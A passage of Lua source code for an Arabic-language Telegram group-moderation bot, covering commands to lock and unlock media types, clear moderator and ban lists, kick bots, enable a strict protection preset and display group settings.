faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:gifs:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » المتحركه سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الاغاني" then
if KASPERdx1:get(KASPER..'bot:music:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الاغاني  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:music:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الاغاني سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الصوت" then
if KASPERdx1:get(KASPER..'bot:voice:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الصوت  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 50, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:voice:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الصوت سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الروابط" then
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الروابط  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:links:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الروابط سابقا ،', 1, 'md')
end end
if unmutepts[2] == "المواقع" then
if KASPERdx1:get(KASPER..'bot:location:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » المواقع  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:location:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » المواقع سابقا ،', 1, 'md')
end end
if unmutepts[2] == "المعرف" then
if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » المعرف  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 51, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'tags:lock'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » المعرف سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الحمايه" then
if KASPERdx1:get(KASPER..'bot:strict'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الحمايه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:strict'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الحمايه سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الهاشتاك" then
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الهاشتاك  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:hashtag:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الهاشتاك سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الجهات" then
if KASPERdx1:get(KASPER..'bot:contact:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الجهات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 51, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:contact:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الجهات سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الشبكات" then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الشبكات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:webpage:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الشبكات سابقا ،', 1, 'md')
end end
if unmutepts[2] == "العربيه" then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » العربيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:arabic:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » العربيه سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الانكليزيه" then
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الانكليزيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 55, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:english:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الانكليزيه سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الاشعارات" then
if KASPERdx1:get(KASPER..'bot:tgservice:jk'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الاشعارات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 54, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:tgservice:jk'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الاشعارات سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الملصقات" then
if KASPERdx1:get(KASPER..'bot:sticker:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الملصقات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:sticker:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الملصقات سابقا ،', 1, 'md')
end end 
if unmutepts[2] == "التوجيه" then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » التوجيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:forward:mute'..msg.chat_id_)
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » التوجيه سابقا ،', 1, 'md')
end end end end
--     By Developer KASPER     -- 
if text == ("قفل الكل") and is_momod(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end 
KASPERdx1:set(KASPER..'editmsg'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:cmds'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:bots:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:bots:ban'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'keed_bots'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'anti-flood:'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:pin:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:inline:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:photo:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:spam:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:video:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:gifs:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:music:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:voice:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:links:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:location:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'tags:lock'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:strict'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:document:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:hashtag:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:contact:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:webpage:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:sticker:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'markdown:lock'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:forward:mute'..msg.chat_id_,true) 
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » كل الوسائط  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 55, string.len(msg.sender_user_id_))
end 
if text == ("فتح الكل") and is_momod(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
KASPERdx1:del(KASPER..'farsi'..msg.chat_id_)
KASPERdx1:del(KASPER..'farsiban'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:text:mute'..msg.chat_id_)
KASPERdx1:del(KASPER.."fshar"..msg.chat_id_)
KASPERdx1:del(KASPER.."taf"..msg.chat_id_)
KASPERdx1:del(KASPER.."kaf"..msg.chat_id_)
KASPERdx1:del(KASPER..'editmsg'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:cmds'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:bots:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:bots:ban'..msg.chat_id_)
KASPERdx1:del(KASPER..'keed_bots'..msg.chat_id_)
KASPERdx1:del(KASPER..'anti-flood:'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:pin:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:photo:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:spam:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:video:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:document:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:inline:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'markdown:lock'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:gifs:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:music:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:voice:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:links:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:location:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'tags:lock'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:strict'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:hashtag:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:contact:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:webpage:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:sticker:mute'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:forward:mute'..msg.chat_id_)
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » كل الوسائط  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 55, string.len(msg.sender_user_id_))
end  
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع عدد الاحرف (%d+)$") then
local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اختر عدد اكبر من 40 حرف ، ', 1, 'md')
else
KASPERdx1:set(KASPER..'bot:sens:spam'..msg.chat_id_,sensspam[2])
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع عدد الاحرف [ ' ..sensspam[2]..' ]\n✟︙عندما تتجاوز الكليشه '..sensspam[2]..' حرف انا سوف احذفها ،', 1, 'md')
end end end
--     By Developer KASPER     -- 
if is_sudo(msg) then
if text and text:match("^تعديل (.*)$") then
local editmsgs = {string.match(text, "^(تعديل) (.*)$")}
edit(msg.chat_id_, msg.reply_to_message_id_, nil,editmsgs[2], 1, 'html')
end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^مسح (.*)$") and KASPER11(msg) then
local txts = {string.match(text, "^(مسح) (.*)$")}
if txts[2] == 'المحظورين' then
KASPERdx1:del(KASPER..'bot:banned:'..msg.chat_id_) 
local KASPER = '✟︙تم مسح المحظورين ،  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 33, string.len(msg.sender_user_id_))
end
if is_sudo(msg) then 
if txts[2] == 'قائمه العام' then
KASPERdx1:del(KASPER..'bot:gban:')
local KASPER = '✟︙تم مسح قائمه العام ،  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 35, string.len(msg.sender_user_id_))
end end
if is_leader(msg) then 
if txts[2] == 'مطورين الرتبه الثالثه' then
KASPERdx1:del(KASPER..'bot:admins:')
local KASPER = '✟︙تم مسح مطورين الرتبه الثالثه ، \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 44, string.len(msg.sender_user_id_))
end end
if txts[2] == 'البوتات' then
local botslist = function(extra, result)
local list = result.members_
for i = 0, #list do
if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
end end end
local KASPER = '✟︙تم مسح البوتات ،  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 31, string.len(msg.sender_user_id_))
getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'المنشئين' then
local KASPER = '✟︙تم مسح المنشئين ، \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 31, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:monsh2:'..msg.chat_id_)
end end
if txts[2] == 'الادمنيه' then
local KASPER = '✟︙تم مسح الادمنيه ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 32, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:momod:'..msg.chat_id_)
end
if txts[2] == 'المطايه' then
local KASPER = '✟︙تم مسح المطايه ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 31, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:donky:'..msg.chat_id_)
end
if txts[2] == 'الاعضاء المميزين' then
local KASPER = '✟︙تم مسح الاعضاء المميزين ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 40, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:vipmem:'..msg.chat_id_)
end
if txts[2] == 'قائمه المنع' then
local KASPER = '✟︙تم مسح قائمه المنع ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 35, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:filters:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' then
KASPERdx1:del(KASPER..'bot:muted:'..msg.chat_id_)
local KASPER = '✟︙تم مسح المكتومين ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 33, string.len(msg.sender_user_id_))
end end end
if text == 'مسح الرابط' and KASPER11(msg) then
KASPERdx1:del(KASPER.."bot:group:link"..msg.chat_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم مسح رابط المجموعه ، ', 1, 'md')
end
--     By Developer KASPER     -- 
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^مسح (.*)$") and KASPER11(msg) then
local txts = {string.match(text, "^(مسح) (.*)$")}
if txts[2] == 'قائمه المنع العام' then
local KASPER = '✟︙تم مسح قائمه المنع العام ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 41, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:freewords:')
end
if txts[2] == 'المكتومين عام' then
local KASPER = '✟︙تم مسح المكتومين عام ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 44, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:mutedall:')
end
if txts[2] == 'المدراء' then
local KASPER = '✟︙تم مسح المدراء ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 31, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:owners:'..msg.chat_id_)
end
if txts[2] == 'المنشئين الاساسيين' then
local KASPER = '✟︙تم مسح المنشئين الاساسيين ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 42, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:monsh:'..msg.chat_id_)
end
if txts[2] == 'الادمنيه العامين' then
local KASPER = '✟︙تم مسح الادمنيه العامين ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 40, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:moall:')
end
if txts[2] == 'المميزين عام' then
local KASPER = '✟︙تم مسح المميزين عام ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 36, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:vpall:')
end
if txts[2] == 'المدراء العامين' then
local KASPER = '✟︙تم مسح المدراء العامين ،  \n✟︙بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 39, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:onall:')
end end end
if text and text:match("^مسح القوائم$") and KASPER11(msg) then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذه الخاصيه للمنشئ والرتب الاعلى منه ، ', 1, 'md')
else
KASPERdx1:del(KASPER..'bot:banned:'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:momod:'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:donky:'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:vipmem:'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:filters:'..msg.chat_id_)
KASPERdx1:del(KASPER..'bot:muted:'..msg.chat_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم مسح المحظورين ، \n✟︙تم مسح الادمنيه ،\n✟︙تم مسح المميزين ،\n✟︙تم مسح المطاية ،\n✟︙تم مسح قائمه المنع ،\n✟︙تم مسح المكتومين ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •~~\n✟︙تم مسح هذه القوائم بواسطه ، '..renk_KASPER(msg)..' ', 1, 'md')
end end
--     By Developer KASPER     -- 
if text and text:match("^تفعيل الحمايه القصوى$") or text:match("^قفل التفليش$") and KASPER11(msg) then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذه الخاصيه للمنشئ والرتب الاعلى منه ، ', 1, 'md')
else
KASPERdx1:set(KASPER..'bot:links:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:forward:mute'..msg.chat_id_,true)
KASPERdx1:del(KASPER..'lock:get:photo'..msg.chat_id_)
KASPERdx1:set(KASPER..'bot:bots:ban'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'anti-flood:'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:video:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:gifs:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'bot:sticker:mute'..msg.chat_id_,true)
KASPERdx1:set(KASPER..'farsiban'..msg.chat_id_,true)
KASPERdx1:del(KASPER.."fshar"..msg.chat_id_)
KASPERdx1:del(KASPER.."taf"..msg.chat_id_)
KASPERdx1:del(KASPER.."kaf"..msg.chat_id_)
KASPERdx1:set(KASPER..'floodstatus'..msg.chat_id_,'Kicked')
KASPERdx1:set('KASPER:id:photo'..msg.chat_id_,true)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل جلب الصوره ،\n✟︙تم قفل البوتات بالطرد ،\n✟︙تم قفل التكرار ،\n✟︙تم قفل الروابط ،\n✟︙تم قفل التوجيه ،\n✟︙تم قفل الملصقات ،\n✟︙تم قفل المتحركه ،\n✟︙تم قفل الفيديو ،\n✟︙تم قفل الفشار ،\n✟︙تم قفل الكفران ،\n✟︙تم قفل الطائفيه ،\n✟︙تم وضع التكرار بالطرد ،\n✟︙تم قفل الفارسيه بالطرد ،\n✟︙تم وضع الايدي بدون صوره ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •~~\n✟︙تم تفعيل الحمايه القصوى بواسطه ، { '..renk_KASPER(msg)..' } ', 1, 'md')
end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الاعدادات$") and KASPER11(msg) then
if KASPERdx1:get(KASPER..'farsi'..msg.chat_id_) then mute_farsi = 'مفعل ✔️' else mute_farsi = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'farsiban'..msg.chat_id_) then mute_farsiban = 'مفعل ✔️' else mute_farsiban = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:bots:ban'..msg.chat_id_) then mute_botsban = 'مفعل ✔️' else mute_botsban = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'keed_bots'..msg.chat_id_) then mute_botske = 'مفعل ✔️' else mute_botske = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER.."fshar"..msg.chat_id_) then mute_fshar = 'مفعل ✔️' else mute_fshar = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER.."taf"..msg.chat_id_) then mute_taf = 'مفعل ✔️' else mute_taf = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER.."kaf"..msg.chat_id_) then mute_kaf = 'مفعل ✔️' else mute_kaf = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:muteall'..msg.chat_id_) then mute_all = 'مفعل ✔️' else mute_all = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:text:mute'..msg.chat_id_) then mute_text = 'مفعل ✔️' else mute_text = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مفعل ✔️' else mute_photo = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:video:mute'..msg.chat_id_) then mute_video = 'مفعل ✔️' else mute_video = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مفعل ✔️' else mute_gifs = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then mute_flood = 'مفعل ✔️' else mute_flood = 'معطل ✖️' end
------------KASPER
if not KASPERdx1:get(KASPER..'flood:max:'..msg.chat_id_) then
flood_m = 5 else
flood_m = KASPERdx1:get(KASPER..'flood:max:'..msg.chat_id_) end
------------KASPER
if not KASPERdx1:get(KASPER..'bot:sens:spam'..msg.chat_id_) then
spam_c = 250 else
spam_c = KASPERdx1:get(KASPER..'bot:sens:spam'..msg.chat_id_) end
------------KASPER
if KASPERdx1:get(KASPER..'floodstatus'..msg.chat_id_) == "DelMsg" then
floodstatus = "بالمسح"
elseif KASPERdx1:get(KASPER..'floodstatus'..msg.chat_id_) == "Kicked" then
floodstatus = "بالطرد"
elseif not KASPERdx1:get(KASPER..'floodstatus'..msg.chat_id_) then
floodstatus = "بالمسح" end
------------KASPER
if KASPERdx1:get(KASPER..'bot:music:mute'..msg.chat_id_) then mute_music = 'مفعل ✔️' else mute_music = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:bots:ban'..msg.chat_id_) then mute_bots = 'مفعل ✔️' else mute_bots = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مفعل ✔️' else mute_in = 'معطل ✖️' end
------------KASPER 
if KASPERdx1:get(KASPER..'bot:cmds'..msg.chat_id_) then mute_cmd = 'مفعل ✔️' else mute_cmd = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مفعل ✔️' else mute_voice = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'editmsg'..msg.chat_id_) then mute_edit = 'مفعل ✔️' else mute_edit = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then mute_links = 'مفعل ✔️' else mute_links = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مفعل ✔️' else lock_pin = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مفعل ✔️' else lock_sticker = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مفعل ✔️' else lock_tgservice = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مفعل ✔️' else lock_wp = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:strict'..msg.chat_id_) then strict = 'مفعل ✔️' else strict = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then lock_htag = 'مفعل ✔️' else lock_htag = 'معطل ✖️' end
------------KASPER
